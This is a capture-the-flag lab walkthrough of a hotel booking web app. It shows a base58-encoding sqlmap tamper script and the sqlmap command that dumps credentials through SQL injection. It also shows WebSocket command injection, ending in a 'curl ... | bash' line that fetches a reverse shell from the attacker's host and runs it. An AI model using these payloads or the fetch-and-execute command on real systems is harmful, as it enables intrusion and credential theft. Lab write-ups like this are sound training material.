If we check the web application at port 80, we can find this:

We got some utilities, if we try booking a room, this happens:


![](Pasted%20image%2020250702155725.png)



We get an alert saying the hotel is currently fully booked, that's weird, let's check other functionalities:

![](Pasted%20image%2020250702161606.png)


![](Pasted%20image%2020250702161616.png)

Let's check the other port:

![](Pasted%20image%2020250702164915.png)

Nothing we can do yet, no credentials. Our best chance is the other web application.

Ok, we got some info, if we check source code, we can find this:


![](Pasted%20image%2020250702161710.png)

There's a call to `check-rooms.js`:

![](Pasted%20image%2020250702161728.png)

The script pulls in the current room count from `/api/rooms-available`, turns on the “#booking” button, and then wires up its click handler: if fewer than 6 rooms are reported it sends you straight to `new-booking`, otherwise it pops up an alert saying the hotel’s fully booked.

Let's interact with the API: 

```bash
curl -s -X GET http://10.10.129.203/api/rooms-available
6
```

Not much we can do with it, we can check `new-booking` though:

![](Pasted%20image%2020250702162514.png)



![](Pasted%20image%2020250702162458.png)



![](Pasted%20image%2020250702162544.png)

This script defines a `getCookie` helper to extract a named cookie’s value, then uses it to retrieve the `BOOKING_KEY` from `document.cookie`. It sends a GET request to `/api/booking-info?booking_key=<key>`, parses the JSON response, and auto‑fills the form fields `#rooms` with `data.room_num` and `#nights` with `data.days`, effectively pre‑populating the booking form based on the stored booking key.

As seen, we can notice the `BOOKING_KEY` cookie on our browser:

![](Pasted%20image%2020250702162749.png)

This is base58 encoding, if we use cyberchef, we can notice this:

![](Pasted%20image%2020250702162847.png)

We got:

```
booking_id:9148112
```

Let's interact with the API, for now, we can begin exploitation phase.


# EXPLOITATION
---

We can interact with the API using curl or a proxy, I'll use caido:


![](Pasted%20image%2020250702163137.png)

It says not found, let's try sending another stuff as the key, maybe `LFI` or `SQLI` works, even `SSRF`:

![](Pasted%20image%2020250702163549.png)

![](Pasted%20image%2020250702163351.png)

LFI doesn't work here, I tried some payloads but no luck, let's try `SQLI`:

![](Pasted%20image%2020250702163611.png)


![](Pasted%20image%2020250702163714.png)

No bad request so it may work, let's try to enumerate the number of rows by using `order by`:

![](Pasted%20image%2020250702163810.png)

![](Pasted%20image%2020250702163858.png)

![](Pasted%20image%2020250702163911.png)

On `3` we get a bad request, which means that SQLI is possible, we can automate the process with `sqlmap` but we need a tamper, a tamper is a little Python hook that sits between the tool and the target, grabbing every injection payload sqlmap generates and transforming it before it’s sent. we need it thanks to the `base58` format, let's use this script:

```python
from lib.core.enums import PRIORITY
import base58

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Encode the payload with base58 :)
    """
    if payload:
        prefixed_payload = f"booking_id:{payload}"
        encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
        return encoded_payload
    return payload
```

Now, we need to create a tamper.py file with those contents and an `__init__.py` file too, once we do it, we can send the following `sqlmap` command:

```bash
sqlmap -u "http://IP/api/booking-info?booking_key=" -p "booking_key" --tamper=PATH TO TAMPER.PY/tamper.py --dbms=sqlite --technique=U --string="not found" --random-agent --level=5 --risk=3 --dump -batch
```


Make sure you got `base58` on pip before using the command:

```
pip install base58
```

We can see this:

![](Pasted%20image%2020250702164805.png)


There are some credentials:

```
pdenton:4321chameleon
```

We can use them on the 4346 port web application:


![](Pasted%20image%2020250702165049.png)


There's a message from `SweetCharity` to our user, we can see this on the source code:

![](Pasted%20image%2020250702165158.png)

There's a `js` script embedded, let's beautify it:

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
    elems[i].addEventListener("click", (e => {
        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
        let t = e.target.parentElement.getAttribute("data-id"),
            n = e.target.parentElement.querySelector(".col_from").innerText,
            r = e.target.parentElement.querySelector(".col_subject").innerText;
        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
            document.querySelector("#email_content").innerText = atob(e)
        }))
    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
        e.preventDefault(), window.location.href = "/"
    }))
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
```

This snippet first grabs every row in the “.email_list” and wires up a click handler so that when a row is clicked it: 

1) removes the “selected” class from whatever was highlighted and adds it to the clicked row, 
2) pulls out that row’s `data-id`, sender name, and subject text, 
3) updates the headers on the page, and 
4) does a GET to `/api/message?message_id=<id>`, reads the plain‑text (which is Base64‑encoded), decodes it with `atob()`, and dumps it into the message body area. It also hooks a “back” button to redirect to “/” and opens a WebSocket to `ws://<host>/ws`, sending the browser’s time zone string every second and updating a “.time” element with whatever the server pushes back.


Due to the format of `/message?message_id=id`, we may be able to fuzz, let's automate the process on Caido:

Subject: SPAM: Tired of life?

Hello Friend,

Has life become too impersonal, too tedius, too painful for you?  Then now is
the time to exert control, to make that decision which is ultimately the only
real choice we ever have: the decision to die.

Some may describe this as an act of selfishness, but with the dwindling
reserves of natural resources throughout the world you're actually
contributing to the well-being of all those around you.  A recent bill passed
by the United States Congress even authorizes a one-time payment of c10,000 to
your chosen benefactor upon passing away.

So do yourself, your family, and your friends a favor and visit any one of the
KVORK, Inc. clinics in a neighborhood near you. We'll help you make a
difference - quickly and quietly.

Sincerely,

Derek Schmitt
Director of Development, KVORK, inc.

Hey JC,

Thought I'd help you unload your boxes, but I'm tied down trying to get one of
the medical analyzers working.  Damn thing nearly lasered off one of my fingers!
Catch you later for a beer maybe?

That's all we can find for the id fuzzing part, if we remember the script opens a `websocket`, we can manipulate this WebSocket to execute commands using:

```
socket.send
```

This works with `"$()"`, thanks to command injection, if we send:

```
socket.send("$(ls)")
```

We can see a `bin` on top, which goes away pretty quickly, this means that command injection is possible, so, getting a shell is possible too, in order to get a shell, we can use `busybox` or create a `index.html` file with these contents:



Now, we need to host it using a python server and use curl to get the file, once the file downloads, we need to use bash to execute it, we can do all this with the following command:

```
socket.send("$(curl http://10.14.21.28/shell|bash)")
```

>Note: Make sure to use only ports `80` and `443` because the server is only able to reach them on those ports:
